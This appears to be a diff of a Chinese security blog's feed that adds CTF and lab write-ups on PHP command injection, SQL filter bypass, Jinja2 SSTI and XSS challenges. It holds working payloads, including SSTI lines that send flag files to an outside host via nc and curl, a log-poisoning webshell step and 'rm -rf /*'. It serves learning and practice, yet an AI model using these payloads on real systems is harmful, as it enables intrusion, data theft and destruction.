+<pre><code>?id=2 ||id=1000
+</code></pre>
+<p>不可以使用负数</p>
+<h2 id="4web4">4.web4</h2>
+<pre><code>?id=2 ||id=1000
+</code></pre>
+<h2 id="5web5">5.web5</h2>
+<pre><code>二进制 0b1111101000
+
+两次取反 ~~1000
+</code></pre>
+<h2 id="6web6">6.web6</h2>
+<pre><code>二进制 0b1111101000
+
+两次取反 ~~1000
+</code></pre>
+<h2 id="7web7">7.web7</h2>
+<p>/'|&quot;|or|||-|\|/|\*|&lt;|&gt;|^|!|~|x|hex|(|)|+|select/i</p>
+<p>过滤</p>
+<pre><code>' &quot; or | - / * &lt; &gt; ^ ! ~ x hex () + select
+</code></pre>
+<h2 id="总结">总结</h2>
+<pre><code>'1000' 字符串
+&quot;1000&quot;
+1 or 1=1 %23 or绕过
+1 || 1=1 %23 替换or
+500/0.5 计算
+2*500
+500&lt;&lt;1 每次增加一倍
+~~1000 
+0x3e8
+hex(1000)
+1+999
+1 union select * from article where id=1000
+0b1111101000
+</code></pre>
+<h2 id="8web8">8.web8</h2>
+<p>删库跑路是吧</p>
+<pre><code>rm -rf /*
+“rm [选项] 文件名… ”
+“- f ”忽略不存在的文件，强制删除，不给出提示。
+“- r” 指示rm将参数中列出的全部目录和子目录均递归地删除。
+“- i ”进行交互式删除。
+</code></pre>
+<h2 id="9web9">9.web9</h2>
+<pre><code>?c=system('cat config.php');
+</code></pre>
+<h2 id="10web10">10.web10</h2>
+<pre><code>?c=passthru('cat config.php');
+</code></pre>
+<h2 id="11web11">11.web11</h2>
+<pre><code>?c=passthru('&quot;ca&quot;&quot;t&quot; config.php');
+</code></pre>
+<h2 id="12web12">12.web12</h2>
+<pre><code>?c=$a=base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);
+</code></pre>
+<h2 id="13web13">13.web13</h2>
+<pre><code>?c=assert(base64_decode('c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp'))?&gt;
+</code></pre>
+<h2 id="14web14">14.web14</h2>
+<p>法一</p>
+<pre><code>?c=echo `$_POST[a]`?&gt;
+</code></pre>
+<p>用hackbar进行post传参</p>
+<p>或者</p>
+<p>burp抓包</p>
+<p>1.更改请求头为POST</p>
+<p>2.添加 Content-Type: application/x-www-form-urlencoded</p>
+<p>3.提交a=cat config.php</p>
+<p>法二</p>
+<p>文件包含漏洞</p>
+<pre><code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=config.php
+</code></pre>
+<h2 id="15web15">15.web15</h2>
+<p>同web14,过滤了&gt;</p>
+<pre><code>?c=include$_GET[a];&amp;a=php://filter/read=convert.base64-encode/resource=config.php
+</code></pre>
+<h2 id="16web16">16.web16</h2>
+<pre><code>?c=36d 奇怪的东西和奇怪的wp
+</code></pre>
+<h2 id="17web17">17.web17</h2>
+<p>无法使用任何的php路径，禁止了远程文件包含，看过wp后发现可以使用日志包含</p>
+<p>在</p>
+<pre><code>?c=/var/log/nginx/access.log
+</code></pre>
+<p>中看到存在有user的信息，因此将一句话木马写入user头中，使用蚁剑链接即可</p>
+<p>然后flag在36d.php下</p>
+<pre><code>1、可以利用php中的?&gt;来闭合语句
+2、Linux中的反引号作用是优先执行
+3、可以利用引号绕过cat过滤
+</code></pre>
+<pre><code class="language-php">根据黑名单的不同，获取config.php的内容有以下几种方法:
+1.命令执行函数
+system()、passthru()、exec()、shell_exec()、popen()、proc_open()、pcntl_exec()
+?c=passthru('cat config.php');
+
+2.构造
+?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');
+
+3.绕过cat命令
+?c=highlight_file('config.php');
+?c=system('ca&quot;&quot;t config.php');
+?c=system(&quot;ca''t config.php&quot;);
+?c=system('ca\t config.php');
+linux有很多类似于cat的方法:tac、more、less、head、tail、nl、sed、sort、uniq
+
+4.base64绕过
+?c=$a=base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);
+
+5.绕过分号;
+?c=system('cat config.php')?&gt;
+?c=assert(base64_decode('c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp'))?&gt; //assert()会将字符串当做PHP代码来执行，并且字符串末尾可以没有分号
+
+6.POST传值
+?c=echo `$_POST[&quot;sung&quot;]`; // ``是为了执行命令
+//然后再通过post传参sung=cat+config.php,具体是通过BUrpsuite抓包然后修改为POST，然后加Content-Type: application/x-www-form-urlencoded或者用浏览器插件hackerbar添加POST data。
+
+其他函数:
+//打印该目录下所有文件名
+?c=var_dump(glob('*')); //信息更全面
+?c=print_r(glob('*'));
+?c=print_r(scandir('.'));
+//下面两个同第二个，只是不带参数
+?c=print_r(scandir(pos(localeconv())));
+?c=print_r(scandir(current(localeconv())));
+</code></pre>
+<h2 id=""></h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[xctf新手web]]></title>
+        <id>https://gudiffany.github.io/post/xctf-xin-shou-web/</id>
+        <link href="https://gudiffany.github.io/post/xctf-xin-shou-web/">
+        </link>
+        <updated>2022-08-14T05:13:01.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="1training-www-robots">1.Training-WWW-Robots</h2>
+<p>1.首先点击进入，看到一大串英文，翻译一下，发现是有关于robots.txt的。直接在网址后面加上/robots.txt，发现以下代码</p>
+<pre><code class="language-php">User-agent: *
+Disallow: /fl0g.php
+
+
+User-agent: Yandex
+Disallow: *
+</code></pre>
+<p>发现存在/fl0g.php，替换后缀</p>
+<p>flag：cyberpeace{a41a79b5062905697093c22094368a80}</p>
+<h2 id="2php2">2.PHP2</h2>
+<p>1.进入之后发现一串英文，然后看一下index.php，但是没有东西，然后发现题目是PHP2，找相关的php，发现有phps的源码文件，之后根据以下源码GET传参：</p>
+<pre><code class="language-php">&lt;?php
+if(&quot;admin&quot;===$_GET[id]) {
+  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+  exit();
+}
+
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == &quot;admin&quot;)
+{
+  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
+}
+?&gt;
+
+Can you anthenticate to this website?
+</code></pre>
+<p>发现代码又一次对id进行url解码，因此需要GET传参时二次编码</p>
+<p>比较大的问题就是admin第一次编码需要对照表来弄（懒惰的我找到直接可以选择全字符编码的网站http://web.chacuo.net/charseturlencode）</p>
+<p>然后编码传参即可。</p>
+<h2 id="3unserialize3">3.unserialize3</h2>
+<p>1.直接给代码</p>
+<p>class xctf{<br>
+public $flag = '111';<br>
+public function __wakeup(){<br>
+exit('bad requests');<br>
+}<br>
+?code=</p>
+<p>发现wakeup()函数，应该就是反序列化漏洞了，搜一下相关资料，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</p>
+<p>然后写一下代码</p>
+<pre><code class="language-php">&lt;?php
+class xctf
+{
+    public $flag = '111';
+
+    public function __wakeup()
+    {
+        exit('bad requests');
+    }
+}
+$a=new xctf();
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>得到结果，然后改一下传参给code就行了</p>
+<p>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</p>
+<p>flag：cyberpeace{5abd84efc56e6be11290fff81d4ad885}</p>
+<h2 id="4ics-06">4.ics-06</h2>
+<p>1.进入网站只有报表中心有跳转，然后选一个日期提交，发现网址多出一个id，直接burp爆破</p>
+<p>然后id为2333时得到flag：cyberpeace{6e272d0fd0bec41ffd1fd36247613337}</p>
+<h2 id="5view_source">5.view_source</h2>
+<p>1.题目描述鼠标右键不管用，直接F12就行了【滑稽】</p>
+<p>flag：cyberpeace{d5f818b143a5248b897c11381f3d8f6c}</p>
+<h2 id="6get_post">6.get_post</h2>
+<p>1.题目考GET和POST的请求方式</p>
+<p>网址用get传参，hacker用post传参</p>
+<p>flag：cyberpeace{5f4c6882d1150f6ebc0a830fa4240e87}</p>
+<h2 id="7robots">7.robots</h2>
+<p>跟上面的Training-WWW-Robots基本一样，进入robots.txt</p>
+<pre><code class="language-php">User-agent: *
+Disallow: 
+Disallow: f1ag_1s_h3re.php
+</code></pre>
+<p>flag：cyberpeace{c7d1f66c20a45691c9233d20b9cdd6ac}</p>
+<h2 id="8backup">8.backup</h2>
+<p>index的备用文件名，搜一下，直接得到index.php.bak</p>
+<p>下载得到文件，用txt文本打开看一下</p>
+<p>得到flag：Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}</p>
+<h2 id="9cookie">9.cookie</h2>
+<p>1.直接在edge的应用程序的cookie中找到存在cookie.php，进入之后用burp抓包重发得到flag：cyberpeace{95def50def57aa0367e958eb17849e52}</p>
+<h2 id="10disabled_button">10.disabled_button</h2>
+<p>直接在前端吧button中的disabled删除就可以按按钮了</p>
+<p>flag：cyberpeace{2e0c3703da9436d3e49f7162ce0ad484}</p>
+<h2 id="11weak_auth">11.weak_auth</h2>
+<p>简单的密码爆破，直接上burp就行（自带的没有123456，要网上下一个）</p>
+<p>flag：cyberpeace{7639f2981c3cfaafd6a39c4a890f851f}</p>
+<h2 id="12simple_php">12.simple_php</h2>
+<p>简单的php弱比较</p>
+<p>构造/?a=t&amp;b=1111111a即可</p>
+<p>flag：Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}</p>
+<h2 id="13baby_web">13.baby_web</h2>
+<p>一道重定向的题目，可以直接抓包或者看网络流</p>
+<p>flag：flag{very_baby_web}</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ssti-labs]]></title>
+        <id>https://gudiffany.github.io/post/ssti-labs/</id>
+        <link href="https://gudiffany.github.io/post/ssti-labs/">
+        </link>
+        <updated>2022-08-14T05:12:29.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ssti-labs">ssti-labs</h1>
+<h2 id="基本知识点">基本知识点</h2>
+<p>思路：</p>
+<p>先写个脚本</p>
+<pre><code class="language-python">import requests
+
+url = &quot;http://127.0.0.1:5000/level/1&quot;
+
+for i in range(500):
+    data = {&quot;code&quot;: '{{&quot;&quot;.__class__.__base__.__subclasses__()['+ str(i) +']}}'}
+    try:
+        response = requests.post(url,data=data)
+        if response.status_code == 200:
+            if &quot;os&quot; in response.text:
+                print(i,&quot;《&quot;,response.text,&quot;》&quot;)
+    except :
+        pass
+</code></pre>
+<p>得到os存在的类</p>
+<p>133 《 Hello &lt;class 'os._wrap_close'&gt; 》</p>
+<pre><code>__class__            类的一个内置属性，表示实例对象的类。
+__base__             类型对象的直接基类
+__bases__            类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases__
+__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
+__subclasses__()     返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
+__init__             初始化类，返回的类型是function
+__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
+__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
+__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
+__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
+__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
+__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
+__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
+url_for              flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
+get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
+lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
+current_app          应用上下文，一个全局变量。
+
+request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
+request.args.x1   	 get传参
+request.values.x1 	 所有参数
+request.cookies      cookies参数
+request.headers      请求头参数
+request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
+request.data  		 post传参	(Content-Type:a/b)
+request.json		 post传json  (Content-Type: application/json)
+
+config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
+self.__dict__		 保存当前类实例或对象实例的属性变量键值对字典，
+{%print(&quot;DMIND&quot;)%}	 控制语句中也能输出
+
+拼接字符：{% set ind=dict(ind=a,ex=a)|join%}		变量ind=index
+获取字符：{{lipsum|string|list|attr('pop')(18)}} 相当于：lipsum|string|list|attr('pop')(18)  输出：_（下划线）
+得到数字：{{lipsum|string|list|attr('index')('g')}} 相当于lipsum|string|list|attr('index')('g') 输出：10
+运算出其他数字：{% set shiba=ten%2bten-two %}        %2b是URL编码后的加号
+
+得到数字：{{dict(a=a)|lower|list|count}}得到16
+运算出其他数字：{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}得到1
+
+得到任意字符：{{dict(dmind=a)|slice(1)|first|first}}得到dmind
+
+获取__builtins__属性：{{lipsum.__globals__|attr('get')('__builtins__')}}		利用get()、pop()获取属性，相当于lipsum.__globals__.get('__builtins__')
+
+lipsum.__globals__.__builtins__  相当于  lipsum|attr('__globals__')|attr('get')('__builtins__')
+lipsum.__globals__.__builtins__.chr(95)  相当于  lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('chr')(95)
+
+得到chr函数：{%set chr=lipsum.__globals__.__builtins__.chr%}
+利用chr()得到字符：{{chr(47)~chr(32)}}  47是/  32是空格  ~是连接符
+
+利用os执行命令：lipsum.__globals__.os.popen('dir').read()  相当于  lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('dir')|attr('read')()
+类似的		  url_for['__globals__']['os']['popen']('dir').read()
+
+简单的读取文件：url_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()
+
+在能执行eval情况下：eval(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://xxx:4567?p=`cat /f*`'))
+</code></pre>
+<h2 id="第一题">第一题</h2>
+<p>没啥好说的，就是根据一堆网上的资料写的</p>
+<pre><code class="language-python">{{&quot;&quot;.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat flag').read()}}
+
+{{&quot;&quot;.__class__.__base__.__subclasses__()[80].__init__.__globals__['__import__']('os').popen(&quot;cat flag&quot;).read()}}
+</code></pre>
+<p>但是我这边没有os模块，也就不列举了</p>
+<p><code>['popen'](&quot;command&quot;).read()</code>主要利用的地方，也可以用system代替popen（本题不行），但是尽量不用system</p>
+<p>在本地找到的是 <code>os._wrap_close</code> 这个类。</p>
+<p>当然利用的还可以是eval()</p>
+<p><code>__import__()</code>等</p>
+<pre><code class="language-python">import requests
+
+url = &quot;http://127.0.0.1:5000/level/1&quot;
+
+for i in range(500):
+    data = {&quot;code&quot;: '{{&quot;&quot;.__class__.__base__.__subclasses__()['+ str(i) +'].__init__.__globals__'+&quot;['popen']&quot;+'}}'}
+    try:
+        response = requests.post(url,data=data)
+        if response.status_code == 200:
+            if &quot;0x&quot; in response.text:
+                print(i,&quot;《&quot;,response.text,&quot;》&quot;)
+    except :
+        pass
+</code></pre>
+<h2 id="第二题">第二题</h2>
+<p>过滤了{{}}</p>
+<p>那么直接可以用{%%}代替</p>
+<p>那么要在{%command%}处执行if，或者for语句</p>
+<p>{%%}{%endif或者endfor%}(这里主要是为了寻找到可利用的模块)</p>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__['popen']('cat flag').read()%}
+	{%endif%}
+{%endfor%}
+</code></pre>
+<p>或者</p>
+<pre><code class="language-python">{%print(x.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat flag').read()&quot;))%}
+</code></pre>
+<h2 id="第三题">第三题</h2>
+<p>盲注</p>
+<p>根据网上提供的wp有两种，一种是dnslog外带，一种是自己nc监听</p>
+<p>那么这边比较不会的是nc监听那么就使用他了</p>
+<p>首先在终端使用命令nc -lvnp 2020监听所有使用2020端口的地址</p>
+<p>然后再使用命令注入</p>
+<pre><code class="language-python">{% for i in ''.__class__.__mro__[-1].__subclasses__() %}
+	{% if i.__name__=='_wrap_close' %}
+		{%print i.__init__.__globals__['popen']('cat flag|nc 0.0.0.0 2020').read()%}
+	{% endif %}
+{% endfor %}
+</code></pre>
+<p>其中mro[-1]可以将类名形成一个元组直接进行for循环</p>
+<p>当然也可以直接将上面的wp改改就行了</p>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__['popen']('cat flag|nc 0.0.0.0 2020').read()%}
+	{% endif %}
+{% endfor %}
+</code></pre>
+<p>那么用一下dnslog来解题</p>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__['popen']('curl http://`cat flag`.t6n089.ceye.io').read()%}
+	{% endif %}
+{% endfor %}
+</code></pre>
+<p>主要是有点慢，而且不显示{}</p>
+<h2 id="第四题">第四题</h2>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__.__getitem__('popen')('cat flag').read()%}
+	{%endif%}
+{%endfor%}
+</code></pre>
+<p>对于索引的<code>[]</code>可以用<code>pop()</code>或<code>__getitem__()</code>代替<code>[]</code>；而类的可以用<code>__getattribute__</code>绕过</p>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__.__getitem__('popen')('cat flag|nc 0.0.0.0 2020').read()%}{%endif%}{%endfor%}
+</code></pre>
+<p>最好使用下面的格式(顺便监听一下)，不然会出现文本变得很长的问题</p>
+<h2 id="第五题">第五题</h2>
+<pre><code class="language-python">{{().__class__.__base__.__subclasses__()[133]}}
+</code></pre>
+<p>先判断一下位置</p>
+<pre><code class="language-html">POST /level/5 HTTP/1.1
+
+Host: 127.0.0.1:5000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+X-Requested-With: XMLHttpRequest
+
+Content-Length: 128
+
+Origin: http://127.0.0.1:5000
+
+Connection: close
+
+Referer: http://127.0.0.1:5000/level/5
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+Cookie:arg1=popen;arg2=cat flag
+
+
+code={{().__class__.__base__.__subclasses__()[133].__init__.__globals__[request.cookies.arg1](request.cookies.arg2).read()}}
+</code></pre>
+<p>将用到‘’和“”的地方换一下发包</p>
+<p>我试过post绕过，但是一直不成功显示no level，不过也是尽量不用post，会改变很多东西，删去post也会导致feibao</p>
+<p>至于chr方法还不是很清楚，后面补</p>
+<h2 id="第六题">第六题</h2>
+<p>编码绕过</p>
+<p>1.16进制编码（中间不用.分隔）</p>
+<pre><code class="language-python">{{&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[133][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;]['popen']('cat flag').read()}}
+</code></pre>
+<p>2.unicode编码</p>
+<pre><code class="language-python">{{lipsum|attr(&quot;\u005f\u005fglobals\u005f\u005f&quot;)|attr(&quot;\u005f\u005fgetitem\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()}}
+</code></pre>
+<p>3.base64（任意编码绕过需要py2，我是用的py3）</p>
+<pre><code class="language-python">{{&quot;&quot;|attr('X19jbGFzc19f'.decode('base64'))|attr('X19iYXNlX18='.decode('base64'))|attr('X19zdWJjbGFzc2VzX18='.decode('base64'))()[133]|attr('X19pbml0X18='.decode('base64'))|attr('X19nbG9iYWxzX18='.decode('base64'))|attr('popen')('cat flag')|attr('read')()}}
+</code></pre>
+<p>需要在py2的情况下，py3编码的问题默认type，所以可以先编码字符串再解码就行了，但是会出现无法绕过的情况，因此该方法仅使用与py2</p>
+<h2 id="第七题">第七题</h2>
+<p>['']绕过</p>
+<pre><code class="language-python">{{&quot;&quot;['__class__']['__base__']['__subclasses__']()[133]['__init__']['__globals__']['popen']('cat flag')['read']()}}
+</code></pre>
+<p>attr()绕过</p>
+<pre><code class="language-python">{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(258)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat flag')|attr('read')()}}
+</code></pre>
+<h2 id="第八题">第八题</h2>
+<p>拼接法</p>
+<pre><code class="language-python">{{&quot;&quot;['__cl'+'ass__']['__ba'+'se__']['__subc'+'lasses__']()['__getitem__'](133)['__in'+'it__']['__gl'+ 'obals__']['__getitem__']('po'+'pen')('cat flag').read()}}
+</code></pre>
+<h2 id="第九题">第九题</h2>
+<p>过滤数字</p>
+<p>1.可以使用第二题的wp</p>
+<pre><code class="language-python">{%print(x.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat flag').read()&quot;))%}
+</code></pre>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__['popen']('cat flag').read()%}
+	{%endif%}
+{%endfor%}
+</code></pre>
+<p>2.使用lipsum</p>
+<pre><code>{{lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()}}
+</code></pre>
+<h2 id="第十题">第十题</h2>
+<pre><code>url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
+get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
+</code></pre>
+<pre><code>{{url_for.__globals__['current_app'].config}}
+
+{{get_flashed_messages.__globals__['current_app'].config}}
+</code></pre>
+<h2 id="第十一题">第十一题</h2>
+<p>接下来就是学会如何构造字符，数字等等</p>
+<p>通用格式</p>
+<pre><code>{% set 变量=dirt(实际值=a)|join%}
+{% set 变量=(已有变量,dirt(实际值=a)|join,已有变量)}
+{% lipsum|string|list %} 查看部分可利用字符，结合pop可以取出字符，attr可以返回其属性
+{% set num=dirt(aaaa(个数=num)=a)|join|count%} count可以换成length
+</code></pre>
+<p>其中pop（）为删除函数</p>
+<pre><code class="language-python">{% set pop=dict(pop=a)|join%}
+{% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%}
+{% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set space=(lipsum|string|list)|attr(pop)(9)%}
+{% set os=dict(os=a)|join %}
+{% set popen=dict(popen=a)|join%}
+{% set cat=dict(cat=a)|join%}
+{% set cmd=(cat,space,dict(flag=a)|join)|join%}
+{% set read=dict(read=a)|join%}
+{{(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}
+</code></pre>
+<h2 id="第十二题">第十二题</h2>
+<pre><code class="language-python">{% set nine=dict(aaaaaaaaa=a)|join|count%}
+{% set eighteen=nine+nine%}
+
+{% set pop=dict(pop=a)|join%}
+{% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%}
+{% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set space=(lipsum|string|list)|attr(pop)(nine)%}
+{% set os=dict(os=a)|join %}
+{% set popen=dict(popen=a)|join%}
+{% set cat=dict(cat=a)|join%}
+{% set cmd=(cat,space,dict(flag=a)|join)|join%}
+{% set read=dict(read=a)|join%}
+{{(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}
+</code></pre>
+<h2 id="第十三题">第十三题</h2>
+<pre><code class="language-python">{% set nine=dict(aaaaaaaaa=a)|join|count%}
+{% set eighteen=dict(aaaaaaaaaaaaaaaaaa=a)|join|count%}
+
+{% set pop=dict(pop=a)|join%}
+{% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%}
+{% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set space=(lipsum|string|list)|attr(pop)(nine)%}
+{% set os=dict(os=a)|join %}
+{% set popen=dict(popen=a)|join%}
+{% set cat=dict(cat=a)|join%}
+{% set cmd=(cat,space,dict(flag=a)|join)|join%}
+{% set read=dict(read=a)|join%}
+{{(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>整体环境为：py3，linux，flask=2.2.2</p>
+<h2 id="特别吐槽">特别吐槽</h2>
+<p>千算万算没想到最后一直没回显是因为win10系统解析不了纯文本，在linux下就可以</p>
+<p>至于如何发现的，那我就是再建立一个flag.txt，发现可以正常调用，那么命令是正常的，但是没办法正常回显</p>
+<p>然后我移动到kali里面，然后做出了第一题</p>
+<p>当然我还是没搞懂再flask1.1.1的情况下会造成前端bootstrap申请css出现500的情况（大概是flask的问题，最新版不出问题，略感难受，文档害死人了），甚至我怀疑是py自带的生产环境有问题，或者网络问题，前者我用第三方的WSGI进行排除，后者我一边用py2运行1.1.1，py3运行2.2.2，然后前后相差不到5s，基本确定是版本问题，原因不清楚</p>
+<p>只能说，So，win10————</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[xss-labs]]></title>
+        <id>https://gudiffany.github.io/post/xss-labs/</id>
+        <link href="https://gudiffany.github.io/post/xss-labs/">
+        </link>
+        <updated>2022-08-14T05:12:01.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="xss-labs">xss-labs</h1>
+<h2 id="level1">level1</h2>
+<p>观察后直接再url上的test添加</p>
+<pre><code class="language-html">&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+</code></pre>
+<h2 id="level2">level2</h2>
+<p>使用搜索框，输入</p>
+<pre><code class="language-html">&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+</code></pre>
+<p>但是被过滤了一部分</p>
+<p>&lt; &gt; “ ”被过滤</p>
+<p>因此需要绕过</p>
+<p>查资料之后发现，&lt; &gt; “ ”被转化成实体html字符实体。</p>
+<p>但是，语句经过了一个input转化为文本，于是可以利用input闭合</p>
+<pre><code class="language-html">&quot;&gt;&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+</code></pre>
+<h2 id="level3">level3</h2>
+<p>即使对input进行闭合，也无法绕过，依然会对&lt;&gt;等进行过滤</p>
+<p>于是需要有一个不用&lt;&gt;的语句</p>
+<p>查资料发现有以下几种</p>
+<pre><code class="language-html">' onclick ='javascript:alert(1)'
+</code></pre>
+<p>点击事件</p>
+<pre><code class="language-html">' onmouseover='javascript:alert(1)'
+</code></pre>
+<p>鼠标移入</p>
+<pre><code class="language-html">'onfocus='javascript:alert(1)'
+</code></pre>
+<p>聚焦点击</p>
+<h2 id="level4">level4</h2>
+<p>单引号换成双引号即可</p>
+<h2 id="level5">level5</h2>
+<p>本题测试之后，首先过滤&lt;&gt;，还有在on，script中会插入_</p>
+<p>那么之前的方法都不能用了</p>
+<p>使用</p>
+<pre><code class="language-html">&quot;&gt;&lt;input type=&quot;url&quot; src=&quot;javascript:alert(‘xss’);&quot;&gt;
+</code></pre>
+<p>进行构造，发现&quot;&gt;留在了搜索框的后面，也就是说有url的注入</p>
+<p>可以用</p>
+<pre><code class="language-html">&quot;&gt;&lt;a href=javascript:alert('xss')&gt;100&lt;/a&gt;
+</code></pre>
+<p>进行构造</p>
+<h2 id="level6">level6</h2>
+<p>比较有趣的是，相比于level5，6少了一个对输入全小写的处理过程，于是可以用大小写绕过str_replace</p>
+<pre><code class="language-html">&quot;&gt;&lt;a hrEf=javascript:alert('xss')&gt;100&lt;/a&gt;
+</code></pre>
+<h2 id="level7">level7</h2>
+<p>过滤script，href,因此需要新思路来看，由于是直接删除字段，那么根据sqli-labs的less25来看，对其进行双写即可</p>
+<pre><code class="language-html">&quot;&gt;&lt;a hrehreff=javascrscriptipt:alert('xss')&gt;100&lt;/a&gt;
+</code></pre>
+<h3 id="level8">level8</h3>
+<p>过滤script，href以及双引号，因此需要看一下源码，发现注入点有两个，其中一个直接放入<a></a>中的url中，于是直接用javascript:alert('xss')同时逃过即可</p>
+<p>而在使用url时，会进行一次解码，所以用unicode编码绕过</p>
